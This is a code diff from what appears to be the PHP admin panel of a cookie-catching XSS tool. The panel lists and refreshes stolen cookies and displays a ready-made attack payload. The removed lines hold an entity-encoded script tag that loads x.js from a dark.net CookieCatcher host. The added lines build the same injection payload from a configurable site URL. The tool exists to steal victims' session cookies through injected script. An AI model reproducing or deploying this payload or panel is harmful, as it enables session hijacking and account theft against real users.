@@ -23,7 +23,7 @@ if(isset($_GET['action'])) {
     case 'refresh':
       $result = $catcher->refresh($_GET['cookieID']);
       $message .= $result ? "Cookie #".htmlspecialchars($_GET['cookieID'])." Refreshed<br/>" : "An error occurred.<br/>";
-      $message .= "<iframe id=\"frame\" src=\"http://".$site_URL."?cookieID=".htmlspecialchars($_GET['cookieID'])."&action=view\"></iframe>";
+      $message .= "<iframe id=\"frame\" src=\"".$siteURL."?cookieID=".htmlspecialchars($_GET['cookieID'])."&action=view\"></iframe>";
       break;
     case 'refresh-all':
       //do something
@@ -68,6 +68,12 @@ if($cookies->recordCount>0) {
   $cookieResults = "Cookie #".$cookie['id']."not found.";
 }
 
+////////////////////////////////////
+## SET ATTACK/PAYLOAD
+$attack = 'x.js';
+$payload = sprintf('<script src="%s%s"/>', $siteURL, $attack);
+$payload = htmlspecialchars($payload);
+
 ?>
 
 <html>
@@ -106,9 +112,7 @@ span { font-family: courier; font-size:12px; }
                                                                    
 </PRE>
 <div id="tag">XSS Payload</div>
-<div id="payload">
-&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x64;&#x61;&#x72;&#x6b;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x43;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x43;&#x61;&#x74;&#x63;&#x68;&#x65;&#x72;&#x2f;&#x78;&#x2e;&#x6a;&#x73;&#x22;&#x3e;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
-</div>
+<div id="payload"><?php echo $payload;?></div>
 
 <p><?php echo $message; ?></p>
 <p>
